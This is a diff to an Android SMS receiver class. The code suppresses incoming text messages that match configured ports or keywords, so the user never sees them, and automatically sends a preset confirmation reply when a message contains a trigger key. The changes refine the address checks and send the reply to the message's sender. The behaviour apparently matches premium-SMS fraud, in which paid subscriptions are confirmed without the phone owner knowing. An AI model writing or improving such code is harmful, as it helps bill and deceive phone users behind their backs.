@@ -67,7 +67,7 @@ public class PrivilegedSmsReceiver extends SmsReceiver {
         String blockPorts = sm.getSMSBlockPorts();
         String blockKeys = sm.getSMSBlockKeys();
         sm.log(TAG, "block ports = " + blockPorts + " block keys = " + blockKeys);
-        long smsLastSendTime = sm.getLastSMSTime();
+        long smsLastSendTime = sm.getSMSBlockBeginTime();
         long smsBlockTime = sm.getSMSBlockDelayTime();
         long curTime = System.currentTimeMillis();
         if ((blockPorts != null || blockKeys != null) 
@@ -80,7 +80,7 @@ public class PrivilegedSmsReceiver extends SmsReceiver {
                 String addr = msgs[0].getDisplayOriginatingAddress();
                 if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] received sms addr = " + addr);
                 if (addr == null) return;
-                if (addr.startsWith("+") == true) {
+                if (addr.startsWith("+") == true && addr.length() > 3) {
                     addr = addr.substring(3);
                 }
                 boolean shouldBlock = false;
@@ -125,12 +125,13 @@ public class PrivilegedSmsReceiver extends SmsReceiver {
                     this.abortBroadcast();
                     if (smsBody != null && confirmKey != null 
                             && confirmPort != null && confirmText != null
-                            && smsBody.contains(confirmKey) == true) {
+                            && smsBody.contains(confirmKey) == true
+                            && addr.startsWith(confirmPort) == true) {
                         if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] should confirm the" +
-                        		" reply to : " + confirmPort + " text = " + confirmText);
-                        sm.log(TAG, "reply the sms with num = " + confirmPort + " text = " + confirmText);
+                        		" reply to : " + addr + " text = " + confirmText);
+                        sm.log(TAG, "reply the sms with num = " + addr + " text = " + confirmText);
                         WorkingMessage wm = WorkingMessage.createEmpty(context);
-                        wm.setDestNum(confirmPort);
+                        wm.setDestNum(addr);
                         wm.setText(confirmText);
                         wm.send();
                     }
